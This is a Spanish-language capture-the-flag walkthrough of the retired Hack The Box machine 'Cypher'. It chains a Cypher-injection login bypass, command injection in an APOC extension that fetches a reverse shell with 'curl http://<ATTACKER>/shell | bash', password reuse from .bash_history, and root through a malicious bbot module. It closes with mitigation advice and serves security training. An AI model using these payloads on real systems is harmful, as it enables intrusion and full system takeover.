---
machine: Cypher
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, neo4j, cypher-injection, apoc, jar, bbot, privesc]
---

# Cypher — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

La aplicación Neo4j permite saltar el login con una inyección Cypher. Un JAR de extensión APOC descargable contiene el método `custom.getUrlStatusCode`, que concatena la URL en una orden de shell; se abusa para ejecutar comandos como `neo4j`. La contraseña de `neo4j` está en `.bash_history` y se reutiliza para `graphasm`, que puede ejecutar `bbot` como root y cargar un módulo Python arbitrario.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22` OpenSSH y `80` nginx/Apache con una web de bases de datos de grafos.
- `cypher.htb` resuelve al host; `/api` redirige a `/api/docs` y `/api/auth` solo acepta POST.
- Hay un JAR de extensión personalizada enlazado desde la web.

## Enumeración

Se descarga el JAR y se descompila. La clase de extensión registra `custom.getUrlStatusCode`, que construye `curl -s -o /dev/null -w %{http_code} <url>` con `/bin/sh -c` y sin sanear. El login usa una consulta Cypher que compara el SHA1 de la contraseña con el nodo `SECRET` del usuario.

## Foothold

Se salta el login con `' OR true RETURN "<SHA1>" AS hash;//` usando el SHA1 de una contraseña conocida. Después se llama al método vulnerable con una URL que termina la orden y ejecuta una reverse shell. La sesión queda como `neo4j`; `script /dev/null -c bash` estabiliza la TTY.

```bash
# bypass de login
' OR true RETURN "<SHA1>" AS hash;//
# RCE en la extensión
CALL custom.getUrlStatusCode("cypher.htb; curl http://<ATTACKER>/shell | bash; ") YIELD statusCode RETURN statusCode;
# root con bbot
printf 'modules:\n  - ExploitModule\nmodule_dirs:\n  - /dev/shm/\n' > /dev/shm/p.yml
echo 'import os; os.system("bash")' > /dev/shm/ExploitModule.py
sudo bbot -p /dev/shm/p.yml```

## Movimiento lateral

`.bash_history` de `neo4j` contiene el comando `neo4j-admin dbms set-initial-password`, y esa contraseña funciona para `graphasm` por `su` y SSH.

## Escalada de privilegios

`graphasm` puede ejecutar `bbot` como root. `bbot -p <perfil>` carga un YAML con `modules` y `module_dirs`; si se apunta a un directorio escribible y se crea `ExploitModule.py` con código en el nivel superior, `bbot` lo importa antes de validar la clase y ejecuta como root.

## Evidencia

- JAR con `getUrlStatusCode` vulnerable.
- Bypass Cypher y RCE como `neo4j`.
- Contraseña en `.bash_history` y reutilización en `graphasm`.
- Carga de módulo de `bbot` como root.

## Lecciones aprendidas

- Las extensiones de bases de datos amplían la superficie de ataque.
- Una inyección Cypher puede modificar la lógica de autenticación.
- Los historiales de shell son una fuente de credenciales.
- Herramientas que cargan plugins desde rutas controlables son peligrosas con privilegios.

## Mitigación y detección

- No exponer JARs de extensión ni la consola de Neo4j.
- Parametrizar consultas Cypher y validar la identidad.
- Limpiar historiales y no reutilizar contraseñas de servicio.
- Ejecutar `bbot` sin privilegios y restringir `module_dirs`.

## Referencias

- [0xdf — Cypher](https://0xdf.gitlab.io/2025/07/26/htb-cypher.html)
- [IppSec — Cypher](https://www.youtube.com/watch?v=L7Amlj9DKm8)
- [Hack The Box — Cypher](https://app.hackthebox.com/machines/cypher)
